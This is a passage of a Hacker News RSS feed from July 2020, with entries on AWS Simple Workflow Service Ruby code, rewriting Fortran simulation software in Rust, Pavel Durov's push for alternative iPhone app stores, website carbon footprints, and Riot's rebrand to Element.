    <span>'drain_machine'</span><span>,</span>
    <span>'fix_machine'</span><span>,</span>
    <span>'reimage_machine'</span><span>,</span>
    <span>'enable_machine'</span>
  <span>]</span>

  <span>def</span> <span>initialize</span>
    <span>super</span><span>()</span>
    <span>register_activities</span>
    <span>poll</span>
  <span>end</span>

  <span># Register the activities with the domain</span>
  <span>def</span> <span>register_activities</span><span>()</span>
    <span>ACTIVITIES</span><span>.</span><span>each</span> <span>do</span> <span>|</span><span>activity</span><span>|</span>
      <span>begin</span>
        <span>@swf</span><span>.</span><span>register_activity_type</span><span>({</span>
          <span>domain: </span><span>DOMAIN_NAME</span><span>,</span>
          <span>name: </span><span>activity</span><span>,</span>
          <span>version: </span><span>VERSION</span><span>,</span>
          <span># Maximum time it can take to process an activity</span>
          <span>default_task_start_to_close_timeout: </span><span>'60'</span>
        <span>})</span>
        <span>puts</span> <span>"Activity </span><span>#{</span><span>activity</span><span>}</span><span> registered"</span>
      <span>rescue</span> <span>Aws</span><span>::</span><span>SWF</span><span>::</span><span>Errors</span><span>::</span><span>TypeAlreadyExistsFault</span>
        <span>puts</span> <span>"Activity </span><span>#{</span><span>activity</span><span>}</span><span> already exists"</span>
      <span>end</span>
    <span>end</span>
  <span>end</span>

  <span># Poll the domain for tasks for this activity</span>
  <span>def</span> <span>poll</span>
    <span>while</span> <span>true</span>
      <span>options</span> <span>=</span> <span>{</span>
        <span>domain: </span><span>DOMAIN_NAME</span><span>,</span>
        <span>task_list: </span><span>{</span>
          <span>name: </span><span>TASK_LIST_NAME</span>
        <span>}</span>
      <span>}</span>
      <span>task</span> <span>=</span> <span>@swf</span><span>.</span><span>poll_for_activity_task</span><span>(</span><span>options</span><span>)</span>

      <span>if</span> <span>task</span><span>.</span><span>task_token</span> <span>==</span> <span>nil</span>
        <span>puts</span> <span>'Polling expired for activities expired. Trying again'</span>
        <span>next</span>
      <span>end</span>

      <span>if</span> <span>!</span><span>ACTIVITIES</span><span>.</span><span>include?</span><span>(</span><span>task</span><span>.</span><span>activity_id</span><span>)</span>
        <span>raise</span> <span>"Activity </span><span>#{</span><span>task</span><span>.</span><span>activity_id</span><span>}</span><span> unknown"</span>
      <span>end</span>

      <span># If execute is successfull, it will return the result, otherwise ti will</span>
      <span># throw</span>
      <span>puts</span> <span>"Executing </span><span>#{</span><span>task</span><span>.</span><span>activity_id</span><span>}</span><span>"</span>
      <span>begin</span>
        <span># Call the method for the activity</span>
        <span>result</span> <span>=</span> <span>send</span><span>(</span><span>task</span><span>.</span><span>activity_id</span><span>,</span> <span>task</span><span>,</span> <span>task</span><span>.</span><span>input</span><span>)</span>

        <span>puts</span> <span>"Completing </span><span>#{</span><span>task</span><span>.</span><span>activity_id</span><span>}</span><span>"</span>
        <span>@swf</span><span>.</span><span>respond_activity_task_completed</span><span>({</span>
          <span>task_token: </span><span>task</span><span>.</span><span>task_token</span><span>,</span>
          <span># SWF doesn't provide a way to know which activity this result</span>
          <span># belongs to, so we'll prepend the result with it</span>
          <span>result: </span><span>"</span><span>#{</span><span>task</span><span>.</span><span>activity_id</span><span>}</span><span>:</span><span>#{</span><span>result</span><span>}</span><span>"</span>
        <span>})</span>
      <span>rescue</span> <span>=&gt;</span> <span>e</span>
        <span>puts</span> <span>e</span>
        <span>puts</span> <span>"Failing </span><span>#{</span><span>task</span><span>.</span><span>activity_id</span><span>}</span><span>"</span>
        <span>@swf</span><span>.</span><span>respond_activity_task_failed</span><span>({</span>
          <span>task_token: </span><span>task</span><span>.</span><span>task_token</span><span>,</span>
          <span>reason: </span><span>@failure</span>
        <span>})</span>
      <span>end</span>
    <span>end</span>
  <span>end</span>

  <span>def</span> <span>probe_machines</span><span>(</span><span>task</span><span>,</span> <span>input</span><span>)</span>
    <span># Because this is just an example and I don't actually have machines to test,</span>
    <span># I'm going to use some mock data</span>
    <span>machines</span> <span>=</span> <span>[</span>
      <span>'machine-A459Z'</span><span>,</span>
      <span>'machine-M3992'</span><span>,</span>
      <span>'machine-A873R'</span>
    <span>]</span>

    <span>machines</span><span>.</span><span>each</span> <span>do</span> <span>|</span> <span>machine</span> <span>|</span>
      <span># A machine is bad, set it to maintenance</span>
      <span>if</span> <span>check_machine</span><span>(</span><span>machine</span><span>)</span> <span>==</span> <span>'FAIL'</span>
        <span># In a real scenario we would update the database with the new state</span>
        <span>puts</span> <span>"Set machine </span><span>#{</span><span>machine</span><span>}</span><span> to maintenance"</span>
        <span>return</span> <span>machine</span>
      <span>end</span>
    <span>end</span>

    <span>puts</span> <span>'No bad machines found'</span>
    <span>return</span> <span>''</span>
  <span>end</span>

  <span># Randomly decide if it's drained. In a real scenario we would communicate with</span>
  <span># the machine, or check a database</span>
  <span>def</span> <span>drain_machine</span><span>(</span><span>task</span><span>,</span> <span>input</span><span>)</span>
    <span>puts</span> <span>"Draining machine </span><span>#{</span><span>input</span><span>}</span><span>"</span>
    <span>random_number</span> <span>=</span> <span>rand</span><span>(</span><span>5</span><span>)</span>
    <span>if</span> <span>random_number</span> <span>==</span> <span>4</span>
      <span>puts</span> <span>'Machine is drained'</span>
      <span>return</span>
    <span>end</span>

    <span>raise</span> <span>"</span><span>#{</span><span>input</span><span>}</span><span> is not drained"</span>
  <span>end</span>

  <span># In real life we would check if a human has marked the task as fixed. In this</span>
  <span># case, we'll just sleep and use a random number</span>
  <span>def</span> <span>fix_machine</span><span>(</span><span>task</span><span>,</span> <span>input</span><span>)</span>
    <span>puts</span> <span>"Check if machine </span><span>#{</span><span>input</span><span>}</span><span> is fixed"</span>
    <span>sleep</span><span>(</span><span>1</span><span>)</span>
    <span>random_number</span> <span>=</span> <span>rand</span><span>(</span><span>2</span><span>)</span>
    <span>if</span> <span>random_number</span> <span>==</span> <span>1</span>
      <span>puts</span> <span>"Machine </span><span>#{</span><span>input</span><span>}</span><span> has been fixed"</span>
      <span>return</span>
    <span>end</span>

    <span>raise</span> <span>"</span><span>#{</span><span>input</span><span>}</span><span> is not fixed yet"</span>
  <span>end</span>

  <span># In real life we would use something like chef to re-image the machine here</span>
  <span># we'll just sleep and use a random number</span>
  <span>def</span> <span>reimage_machine</span><span>(</span><span>task</span><span>,</span> <span>input</span><span>)</span>
    <span>puts</span> <span>"Reimaging </span><span>#{</span><span>input</span><span>}</span><span>"</span>
    <span>sleep</span><span>(</span><span>1</span><span>)</span>
    <span>random_number</span> <span>=</span> <span>rand</span><span>(</span><span>2</span><span>)</span>
    <span>if</span> <span>random_number</span> <span>==</span> <span>1</span>
 ‚Ä¶</pre></td></tr></tbody></table></code></pre></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://ncona.com/2020/07/introduction-to-aws-simple-workflow-service/">https://ncona.com/2020/07/introduction-to-aws-simple-workflow-service/</a></em></p>]]>
            </description>
            <link>https://ncona.com/2020/07/introduction-to-aws-simple-workflow-service/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23844177</guid>
            <pubDate>Wed, 15 Jul 2020 12:26:28 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Rewriting Fortran Software in Rust]]>
            </title>
            <description>
<![CDATA[
Score 146 | Comments 73 (<a href="https://news.ycombinator.com/item?id=23843434">thread link</a>) | @fanf2
<br/>
July 15, 2020 | https://mckeogh.tech/post/shallow-water/ | <a href="https://web.archive.org/web/*/https://mckeogh.tech/post/shallow-water/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><section></section><section><section id="articleHero"><div><header><div><div><p>
July 14, 2020
‚Ä¢ 9 min read</p></div></div></header><p><img src="https://mckeogh.tech/images/shallow-water.png"></p></div></section><article id="articleContent"><h3 id="githubcomrse-standrewscsshallow-waterhttpsgithubcomrse-standrewscsshallow-water"><a href="https://github.com/rse-standrewscs/shallow-water">github.com/rse-standrewscs/shallow-water</a></h3><p>TL;DR: Rewriting isn‚Äôt <em>always</em> bad, <a href="https://en.wikipedia.org/wiki/Amdahl%27s_law">Amdahl‚Äôs Law</a> is important and memory bandwidth is a potential bottleneck when doing many simple double precision math operations</p><h2 id="introduction">Introduction</h2><p>As part of an Undergraduate Research Assistant Scheme in my first year of university I was tasked with parallelising a piece of shallow water simulation software written in FORTRAN by Dr David Dritschel of the Vortex Dynamics Research Group, under supervision of Dr. Alexander Konovalov, at the University of St Andrews. There were secondary goals such as improving the testing infrastructure, setting up CI/CD, estimating progress and allowing the computation to be paused and resumed.</p><p>Forewarning: I have essentially zero domain knowledge in this project (and fluid dynamics simulation isn‚Äôt exactly the kind of topic you can catch up to research level on over a weekend) so I approached this project from a purely software engineering perspective. As for my Rust experience, I‚Äôve been using it for personal projects since ~2016 and I worked as a Rust software engineer at a startup in Berlin for a year after leaving high school.</p><h2 id="dont-rewrite">Don‚Äôt Rewrite</h2><p><a href="https://www.joelonsoftware.com/2000/04/06/things-you-should-never-do-part-i/">Don‚Äôt.</a></p><p><a href="https://understandlegacycode.com/blog/avoid-rewriting-a-legacy-system-from-scratch-by-strangling-it/">Rewrite.</a></p><p><a href="https://medium.com/better-programming/how-i-failed-to-deal-with-legacy-code-8e123cff5bce">Legacy.</a></p><p><a href="https://daedtech.com/the-myth-of-the-software-rewrite/">Code.</a></p><p>Not too hard a concept to grasp, is it? Not much ambiguity and a clear line of reasoning to follow as to why legacy software should not be rewritten. Well I read the articles written by people far more experienced and knowledgable than myself and thought:</p><p><img src="https://mckeogh.tech/post/shallow-water/0e1.png" alt="https://knowyourmeme.com/memes/that-sign-cant-stop-me-because-i-cant-read"></p><h2 id="why-my-situation-is-different">Why <em>My</em> Situation is Different</h2><p>All jokes aside, there are situations where a re-implementation is a reasonable option and I did have several factors to back me up.</p><p>FORTRAN is undoubtably <em>very</em> fast and highly suited to HPC problems with decades-optimised compilers and debugging tooling but it does lack certain features, namely memory safety, thread safety, data race guarantees and ergonomic GPU/CLI/TUI libraries.</p><p>Having written parallel software in both C and Rust, the memory safety guarantees and easy parallelisation with Rayon offered by Rust contrasts quite sharply with my poor experience using OpenMP. Replacing <code>.iter()</code> with <code>.par_iter()</code> and having the compiler automatically throw errors for any code that isn‚Äôt thread safe is amazing compared with adding OpenMP directive sentinels (designed to be hidden from a non OpenMP-compliant FORTRAN compiler) and manually determining thread and memory safety. Here seems a good a place as any to mention that <a href="https://msrc-blog.microsoft.com/2019/07/16/a-proactive-approach-to-more-secure-code/">‚Äú~70% of the vulnerabilities Microsoft assigns a CVE each year continue to be memory safety issues‚Äù</a>.</p><p>It was believed initially that GPUs could be used to accelerate the computation, ~another place where Rust‚Äôs (while not mature) ecosystem also shines above those offered for FORTRAN~ EDIT: completely untrue, FORTRAN‚Äôs GPU acceleratin libraries are very mature and production ready. Additionally when it came to the additional requirements building a <code>ncurses</code> interface in FORTRAN isn‚Äôt exactly ergonomic compared with the libraries available in Rust. I spent some time reading through the original implementation and attempted some basic parallelisation with little success due to small errors being hard to diagnose across long executions without snapshot testing across multiple modules.</p><p>Not only was there several ‚Äúpull‚Äù factors, but there was also the absence of the typical reasons you shouldn‚Äôt rewrite: I was working as a one-person team, the software was finalised and so never needed to be modified again, it was relatively small so could be rewritten in a matter of months (part time) and is not a live business component so uptime and upkeep of the original implementation are irrelevant.</p><p>Given all of this I decided it would be faster to rewrite in Rust, then be able parallelise it and add features quickly than it would be to plough through with the FORTRAN, and with a go-ahead from my supervisor I got to work.</p><h2 id="translating-fortran-to-rust">Translating FORTRAN to Rust</h2><p><em>Relatively</em> straightforward translation of existing codebases in compiled languages to Rust is a noted benefit due to the combination of software like <a href="https://c2rust.com/">C2Rust</a> to perform automatic translation of C source into Rust, <a href="https://github.com/rust-lang/rust-bindgen">bindgen</a> for automatically generating FFI bindings and of Cargo‚Äôs ability to compile code in other languages as part of a Rust project. While there are plenty examples of large projects successfully migrating to Rust this way, the issue I faced was that it would have required a two-step process, first translating from FORTRAN to C and then from C to Rust. I assumed the likelihood that the resulting code would be remotely parsable was very low and I couldn‚Äôt even get either of the most popular FORTRAN to C conversion tools to work.</p><p>Since the original implementation was only 6,000 lines total I decided to go with a manual translation. This involved starting at the base of the module tree with the Fast Fourier Transform routines and working upwards. I kept my process simple by inserting small pieces of FORTRAN to dump state at the beginning and end of routines which was then used for snapshot tests for the Rust implementation. This resulted in a thorough, robust testing suite which was invaluble during the optimization period. I really only made one bad design decision (please don‚Äôt read through the git history to confirm this üòÖ) during the translation phase which was thinking that nested <code>Vec</code>s would be easier than using <code>ndarray</code> from the start. This was a Bad Decision‚Ñ¢Ô∏è and wasted so much time, not only in the abysmal execution speeds slowing down <code>cargo test</code>, but also in that it significantly increased development time. I would replace a statement such as</p><p>with</p><div><pre><code data-lang="rust"><span>// Awful, awful Rust
</span><span></span><span>for</span> i <span>in</span> <span>0</span>..x {
	<span>for</span> j <span>in</span> <span>0</span>..y {
		a[i][j] <span>=</span> a[i][j] <span>*</span> b[i][j]
	}
}
</code></pre></div><p>when the final <code>ndarray</code> version would look like</p><div><pre><code data-lang="rust"><span>// Ergonomic Rust
</span><span></span>a <span>*=</span> <span>&amp;</span>b;
</code></pre></div><p>Clearly the intermediary step could have been skipped and a more direct translation was possible. I wrote a regex to replace FORTRAN array indexing syntax (<code>array(x,y,z)</code>) to nested <code>Vec</code>s in Rust (<code>array[x][y][z]</code>), when <code>ndarray</code> syntax (<code>array[[x,y,z]]</code>) would have been a far simpler conversion. If this decision wasn‚Äôt bad enough, I also wasted time writing several functions to convert between a byte slice and the nested <code>Vec</code>s with the FORTRAN memory layout when <code>ndarray</code> has a built-in preset for FORTRAN shape and strides.</p><p>One issue that arose during testing was that due to the accumulation of small errors in floating point math, results would be slightly different between operating systems and hardware configurations which made the fantastic snapshot testing tool <code>insta</code> unsuitable. Instead <code>ndarray</code>‚Äôs <code>serde</code> and <code>approx</code> feature flags are used to read serialised arrays from disk to compare approximately during tests which has been working well.</p><h2 id="optimizing">Optimizing</h2><h3 id="parallelisation">Parallelisation</h3><p>Fundamentally the problem is not one that may be described as ‚Äúembarrassingly parallel‚Äù, which was the assumption made going into the project (early discussions involved expectations of a 100x improvement on the university cluster). Ideally we would be want many large chunks of independent computation operating on a small amount of data, making it easy to distribute work across threads, GPUs and potentially different machines, but unfortunately I learned this problem is quite far from that ideal.</p><p>The outermost loop advances through time and is therefore strictly sequential, and in the primary function of the program (<code>src/nhswps/advance.rs:advance</code>) a large portion is iterated over twice, also strictly sequential. Some other lower-level functions perform operations on individual layers and so can be parallelised completely, but these are not generally very complex functions and so finish quickly before returning to sequential execution. <a href="https://en.wikipedia.org/wiki/Amdahl%27s_law">Amdahl‚Äôs Law</a> comes into affect here, describing how even if everything that can be parallelised is, there are fundamental limits to the scaling we can ever achieve.</p><h3 id="memory-bandwidth-issues">Memory Bandwidth Issues</h3><p>Throughout the program there are several kinds of operations being performed on the 2- and 3-dimensional arrays. Transformations between physical and spectral is common, involving calling the Fourier transform functions and swapping axes. Other than those, many operations are simple additions, subtractions and multiplications between arrays, sometimes including constants. The result of this is that these simple operations are being performed on some very large amounts of data which I believe is resulting in a memory bandwidth bottleneck. This hypothesis explains why SIMD did not improve performance and performance is not significantly improved by parallelisation. It only takes several cycles to perform a floating point ADD or MUL instruction, so even at tens of gigabytes per second of memory bandwidth it will be insufficient to keep the CPU ‚Äúfed‚Äù. Performing the operations with AVX-2 instructions does not improve performance because even though the same operation may now be performed on several floats simultaneously the limit is still how quickly they may be read from memory. It is slightly more complicated in the multithreaded context because there is an improvement in performance; perhaps due to multiple threads being able to increase the amount of data read from memory. The program is also very cache-unfriendly, reading large amounts of data in only to perform a simple, fast operation before reading in new data. At several gigabytes in size even individual layers aren‚Äôt even close to being able to reside in on-die cache. I am unsure of how I might collect proof of my hypothesis but I believe it explains a great deal of the behaviours I‚Äôve witnessed throughout this project.</p><h3 id="gpu-unsuitability">GPU Unsuitability</h3><p>There was also some hope at the beginning of the project that GPUs could be used but there are two main reasons they are unsuitable.</p><p>Firstly, ~GPUs with large amounts of VRAM (128GB+) simply aren‚Äôt available~ EDIT: I was wrong, <em>commercial</em> gaming and workstation GPUs don‚Äôt get that large, but there are plenty of datacentre options, like the <a href="https://cloud.google.com/blog/products/compute/announcing-google-cloud-a2-vm-family-based-on-nvidia-a100-gpu">A100</a>. There is the <a href="https://www.amd.com/en/products/professional-graphics/radeon-pro-ssg">Radeon Pro SSG</a> which is a really interesting product but the memory bandwidth of ‚Ä¶</p></article></section></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://mckeogh.tech/post/shallow-water/">https://mckeogh.tech/post/shallow-water/</a></em></p>]]>
            </description>
            <link>https://mckeogh.tech/post/shallow-water/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23843434</guid>
            <pubDate>Wed, 15 Jul 2020 10:43:14 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Pavel Durov wants a law to make Apple allow iPhone users install other app store]]>
            </title>
            <description>
<![CDATA[
Score 121 | Comments 115 (<a href="https://news.ycombinator.com/item?id=23843296">thread link</a>) | @vvpvijay
<br/>
July 15, 2020 | https://androidrookies.com/telegram-developer-wants-a-law-to-make-apple-allow-iphone-users-to-install-apps-from-other-app-stores/ | <a href="https://web.archive.org/web/*/https://androidrookies.com/telegram-developer-wants-a-law-to-make-apple-allow-iphone-users-to-install-apps-from-other-app-stores/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-8890"><div><div><div><p>VK social networking website and Telegram messenger App founder and developer, Pavel Durov wants Apple to let iPhone users install different App stores other than Apple App Store. Not only that, but he also wants legislation to make this happen.</p><p>Speaking at the panel discussion with Russian Prime Minister Mikhail Mishustin and representatives of the IT industry in Innopolis, Telegram Manager and Vice President, Ilya Perekopsky said that Apple and Google are holding back the development of startups by charging a tax of 30 percent commission from app developers. Immediately after Perekopsky‚Äôs speech,&nbsp;Durov published an article in which he called for legislation mandating Apple to be legally obliged to allow users to install an alternative App Store on the iPhone. Durov says that Tim Cook, Apple CEO should be obligated to this at the legislative level.</p><p>Durov is taking the bull by its horn. Apple has been successful because of its closed technology. It not only does not allow any other App store to be installed on iPhones but it also takes action against any iPhone jailbreaks that happen. We all know that the <a href="https://androidrookies.com/unc0ver-jailbreak-tool-for-iphone-released-works-on-all-ios-versions-including-ios-13-5/">uc0ver team released a jailbreak</a> exploiting the previously unknown vulnerability in iOS just hours after Apple released iOS 13.5. The <a href="https://androidrookies.com/kernel-vulnerability-unc0ver-jailbreak-patched-as-apple-releases-ios-13-5-1/">iPhone jailbreak was shut down in iOS 13.5.1</a> within days by Apple. Many private iPhone App stores exist like Cydia, Xabsi, etc but they work only on jailbroken iPhones.</p><p>Much of Apple‚Äôs profit is from selling content on its App stores. In fact, Apple‚Äôs App Store platform grossed around $50 billion for App store in 2019, according to an analysis by CNBC. Apple takes 30 percent commission from App developers to make their apps available on Apple Store. Last year it paid $35 billion to developers from the App store revenue and kept $15 billion for itself.</p><p>Durov has reasons for being mad at Apple for not allowing other App stores. Durov says that Russian startups fail to make money by paying 30% to Apple. ‚ÄúPreventing two supranational corporations from collecting taxes from all of humanity is not an easy task. Corporations employ thousands of lobbyists, lawyers, and PR agents, and their budgets are unlimited. At the same time, app developers are scattered and scared, as the fate of their projects depends entirely on the favor of Apple and Google,‚Äù wrote Pavel Durov.</p><p>Durov also has a personal bias for wanting Apple to open up its iOS for alternative App stores. In 2016, Apple banned the Telegram team from launching its own game platform. This hurt Durov and Telegram‚Äôs ambitions, ‚ÄúWe had to remove the telegram games catalog that we had already created and almost the entire platform interface, otherwise Apple threatened to remove Telegram from the AppStore.‚Äù</p><p>Recently, <a href="https://androidrookies.com/apple-threatens-to-remove-hey-com-email-app-unless-it-pays-outrageous-cuts-to-them/">email client, Hey.com</a> had a similar experience with Apple regarding publishing their App on the Apple App store.</p></div></div></div></article></div>]]>
            </description>
            <link>https://androidrookies.com/telegram-developer-wants-a-law-to-make-apple-allow-iphone-users-to-install-apps-from-other-app-stores/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23843296</guid>
            <pubDate>Wed, 15 Jul 2020 10:21:48 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[This Website Is Killing the Planet]]>
            </title>
            <description>
<![CDATA[
Score 34 | Comments 14 (<a href="https://news.ycombinator.com/item?id=23842225">thread link</a>) | @brokebroadbeat
<br/>
July 15, 2020 | https://visitmy.website/2020/07/13/this-website-is-killing-the-planet/ | <a href="https://web.archive.org/web/*/https://visitmy.website/2020/07/13/this-website-is-killing-the-planet/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div aria-label="Content">
      <div>
        <article itemscope="" itemtype="http://schema.org/BlogPosting">

  

  <div itemprop="articleBody">
    <p>For a while I‚Äôve been intending to make my website more sustainable, but I succumbed, as I often do, to the human trait of sloth. But this morning after reading <a href="https://alistapart.com/article/webwaste/">Gerry McGovern‚Äôs post on webwaste</a>, I thought I‚Äôd procrastinated long enough.</p>

<p>So I ran a web page performance test and got some <a href="https://www.webpagetest.org/result/200713_XX_e2daed33a24cd8a099d930fc373b1083/">grim results</a>: my website takes over a minute to load on a Moto G4 on using 3G data networks. It‚Äôs just as bad <a href="https://www.webpagetest.org/result/200713_6E_4e249b485a45882604420068caa21ae0/">using a desktop PC in Nottingham on 1.5Mbps DSL</a>. My website is bloated with large images and a bunch of JavaScript, which means it‚Äôs eating up lots of energy transmitting those bits and bytes.</p>

<p>But how much energy? I used the <a href="https://www.websitecarbon.com/">Website Carbon Calculator</a> to find out. Turns out that</p>

<ul>
  <li>6.90g of CO2 is produced every time someone visits the homepage</li>
  <li>it emits the amount of carbon that 4 trees absorb in a year, and</li>
  <li>it uses enough electricity to drive an electric car 1,116km</li>
</ul>

<p>Eugh. That‚Äôs disgusting. For each year my website has been online, I should have planted 4 trees just for the homepage alone. But, instead, my laziness has filled the atmosphere with more and more carbon.</p>

<p>I have to do something, this has gone on long enough, so I‚Äôm committing to some actions.</p>

<ol>
  <li>I‚Äôll move my site to a web hosting provider using renewable energy, one that‚Äôs listed on the <a href="https://www.thegreenwebfoundation.org/directory/">Green Web Foundation‚Äôs directory</a>. <strong>DONE</strong></li>
  <li>I‚Äôll compress and optimise the images on my site using <a href="https://imageoptim.com/mac">ImageOptim</a>. <strong>DONE</strong></li>
  <li>I‚Äôll get rid of <a href="https://github.com/samesies/barber-jekyll">my energy-guzzling site theme</a> until I can introduce one that‚Äôs lightweight and accessible. <strong>DONE</strong></li>
  <li>Going forward, my website will enshrine the principles of the <a href="https://www.sustainablewebmanifesto.com/">Sustainable Web Manifesto</a>. <strong>SIGNED</strong></li>
  <li><strong>NEW</strong>: I‚Äôll pay for some trees to be planted that‚Äôll reduce the impact of my website‚Äôs carbon footprint going forward.</li>
</ol>

<p>To show my committment to being a good web citizen, I‚Äôll add the <a href="https://www.websitecarbon.com/badge/">Website Carbon Badge</a> to all pages (<strong>DONE</strong>) and the <a href="https://www.thegreenwebfoundation.org/green-web-check/">Green Web Foundation‚Äôs renewable hosting badge</a> (<strong>DONE</strong>). Once I‚Äôve improved things, I‚Äôll add a <a href="https://carbontxt.org/">carbon.txt</a> (<strong>DONE</strong>).</p>

<p>One day I‚Äôll actually get around to building a solar-powered battery bank and run my site off my home connection, but until then I‚Äôm taking small steps to remove, minimise and clean-up my presence on the web.</p>

<p>What‚Äôs the carbon footprint of your website? What steps will you take to reduce it?</p>

<h2 id="further-reading">Further reading</h2>

<ul>
  <li><a href="https://alistapart.com/article/webwaste/">Webwaste</a></li>
  <li><a href="https://pxlnv.com/blog/bullshit-web/">The bullshit web</a></li>
  <li><a href="https://www.wholegraindigital.com/blog/sustainable-web-design/">3 steps to creating zero carbon websites</a></li>
  <li><a href="https://solar.lowtechmagazine.com/2018/09/how-to-build-a-lowtech-website.html">How to build a low-tech website</a></li>
  <li><a href="https://www.thegreenwebfoundation.org/news/notes-for-greening-internet-governance-at-eurodig/">Greening Internet governance: environmental sustainability and digital transformation</a></li>
</ul>

  </div>
</article>



      </div>
    </div></div>]]>
            </description>
            <link>https://visitmy.website/2020/07/13/this-website-is-killing-the-planet/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23842225</guid>
            <pubDate>Wed, 15 Jul 2020 07:15:48 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Riot is now Element]]>
            </title>
            <description>
<![CDATA[
Score 537 | Comments 344 (<a href="https://news.ycombinator.com/item?id=23842179">thread link</a>) | @J_tt
<br/>
July 15, 2020 | https://element.io/blog/welcome-to-element/ | <a href="https://web.archive.org/web/*/https://element.io/blog/welcome-to-element/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Hi everyone,</p><p>We are incredibly excited to announce that <strong>Riot is now Element</strong>! </p><p>In fact we have simplified all our naming: Element is also the name for New Vector (the company behind Riot) while Modular, our flagship Matrix hosting service, has become Element Matrix Services.</p><p>For those discovering us for the first time: Element is the flagship secure collaboration app for the decentralised <a href="https://matrix.org/">Matrix</a> communication network. &nbsp;Element lets you own your own end-to-end encrypted chat server, while still connecting to everyone else in the wider Matrix network.</p><figure><img src="https://element.io/blog/content/images/2020/07/element-logo.png"></figure><p><br>What‚Äôs more, <strong>RiotX is now out of beta</strong> - our next generation Matrix client for Android has flown the nest and spread its wings as Element - replacing the old Riot Android app at last!</p><p>This name change has been a long time in the making. As we explained when we announced the rebrand <a href="https://blog.riot.im/the-world-is-changing/">a few weeks ago</a>, we‚Äôve had major issues with a certain gigantic games company which has blocked us from being able to trademark Riot or even Riot.im - a huge issue when it comes to defending users against abusive forks of the app. Secondly, people incorrectly assume Riot refers to violence, rather than the more constructive forms of chaos we had in mind. Lastly, it made sense in the early days of Matrix to have different brands to illustrate the different roles of Riot, Modular and New Vector in the ecosystem‚Ä¶ but nowadays there are loads of Matrix clients, Matrix hosting providers and companies building on Matrix - and so all New Vector‚Äôs different names were just causing confusion. &nbsp;</p><h3 id="so-why-element">So, why Element?</h3><p>We want a name that reflects the emphasis on simplicity and clarity that we aimed for when designing RiotX; a name that highlights our single-minded mission to make Element the most elegant and usable mainstream comms app imaginable. &nbsp;Riot had a pretty chequered history, spending much of its life in beta, with intermittent attention to design until we hit 1.0 last year - but nowadays we have a dedicated full-time design team working on Element, who not only design the graphics but the overall behaviour of new features in the app. &nbsp;This is not an easy task, given it turns out the hardest bits of end-to-end encryption are almost entirely UX challenges. &nbsp;What‚Äôs more, presenting a global decentralised communication network as simply as a centralised communication island is surprisingly tricky. &nbsp;However: we have been making massive progress, to the extent that we are barely recognisable as the Riot of the past. Element reflects a clean start to focus monomaniacally on mainstream usability in future.</p><p>We also want a name that better evokes the idea of data ownership and self-sovereignty. &nbsp;An element is the smallest indivisible thing in a system - yet one which can stand alone. &nbsp;You can customise it, control it and make it your own - you can literally be in your Element!</p><p>Moreover, we want a name that will be future-proof for peer-to-peer Matrix. &nbsp;As Matrix.org announced last month, <a href="https://matrix.org/blog/2020/06/02/introducing-p-2-p-matrix">P2P Matrix is in heavy development</a> - and we can see a world where Element will literally be an element of Matrix, running your own homeserver within the app, so you can communicate if you don‚Äôt have a server‚Ä¶ or even Internet. In fact, we published the first experimental build of <a href="https://matrix.org/blog/2020/07/10/this-week-in-matrix-2020-07-10#riot-ios-p2p-demo">P2P Riot for iOS</a> on Testflight a few days ago - so we can clearly see a future where we will be in our P2P element!</p><p>Finally, we think it‚Äôs a cool name :D &nbsp;It fits in nicely with the term Matrix while not being as nerdy as Vector. &nbsp;We‚Äôre obviously aware that Element is (once again) both a dictionary word and a mathematical term - but in practice, looking at search results for Element right now, the top hits are for dictionary sites(!) and the field is wide open. &nbsp;Conversely, in a virgin browser on VPN, Riot is the 4th hit on Google for Riot; second only to a certain games company. &nbsp;In other words, we‚Äôve shown that we can successfully adopt dictionary words - and if you do find yourself lost searching in a maze of mathematics, just throw in the word ‚Äòchat‚Äô to get back on track. &nbsp;(For all the linear algebraists who are spitting with rage at this point: we promise we‚Äôll make it up to you by finally sorting out <a href="https://github.com/matrix-org/matrix-react-sdk/pull/3251">latex support</a> in Element!)</p><p>This change is inevitably going to be disruptive, and we‚Äôre painfully aware that we‚Äôve spent four years building up Riot‚Äôs reputation and persuading everyone to move their friends, families and teams onto it. &nbsp;To reiterate what we said when we announced the change, we know that many people reading this will have put their necks on the line to get folks to adopt Riot, and we really appreciate how frustrating it may be to have to explain the change to your users. &nbsp;However, this is unquestionably the right time to shed our skin and make the change, and we hope folks will grow to love Element much more than they ever did Riot. &nbsp;To aid the transition, we‚Äôve named the installable apps ‚ÄúElement (Riot.im)‚Äù for a while to help people get reoriented (e.g. when searching by name for Riot).</p><p>Last but not least: Element isn‚Äôt just a new name - it comes with a massive suite of improvements across Android, iOS and Web.</p><p>We‚Äôll write about these in full over the coming days, but the big headlines are that RiotX (our ground-up rewrite of Riot Android) has exited beta, and replaces Riot Android as Element - complete with VoIP calls and Widget support! Riot Android users will magically autoupgrade into Element; the old RiotX app will be retired in due course. FDroid is likely releasing Element as an entirely new app. &nbsp;Meanwhile On iOS we now have full support for iOS 13, complete with entirely new push notification support (thanks to Apple‚Äôs nightmarish <a href="https://appleinsider.com/articles/19/09/05/secure-messaging-apps-working-to-comply-with-apples-ios-13-privacy-changes">deprecation of PushKit</a>).</p><figure><img src="https://element.io/blog/content/images/2020/07/RiotX-1.png"><figcaption>The App Formerly Known As RiotX!</figcaption></figure><p>On Element Web, we‚Äôve given the UI a massive refresh, with a beautiful new font (<a href="https://rsms.me/inter/">Inter</a>) giving much improved legibility, and we‚Äôve <strong>completely</strong> rewritten the Room List control - adding in room previews(!!), alphabetic ordering, resizable lists, improved notification UI and more. We‚Äôve also landed the first phase of further improving the end-to-end encryption setup process - letting users generate a recovery key rather than forcing them to select a 